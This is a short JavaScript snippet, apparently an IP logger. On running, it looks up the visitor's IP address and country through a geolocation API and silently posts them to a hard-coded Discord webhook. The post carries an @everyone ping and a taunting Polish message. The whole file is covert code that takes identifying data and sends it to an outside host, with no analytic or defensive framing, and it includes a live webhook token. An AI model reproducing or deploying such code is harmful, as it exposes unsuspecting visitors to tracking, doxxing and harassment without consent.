var webHookUrl = "https://discord.com/api/webhooks/1013829481615593554/pIoCV9AGvQW1Lt2ZIVzjc2WVLqvntEmTGmLP7WNRkf-ynQYHvc967w5z7_Gz-0vri8tk";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "https://cdn.discordapp.com/attachments/879360038978875447/1009474138299179178/Tokyo_Revengers.jpeg",
        content:    "**Masz bombe w neta ** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
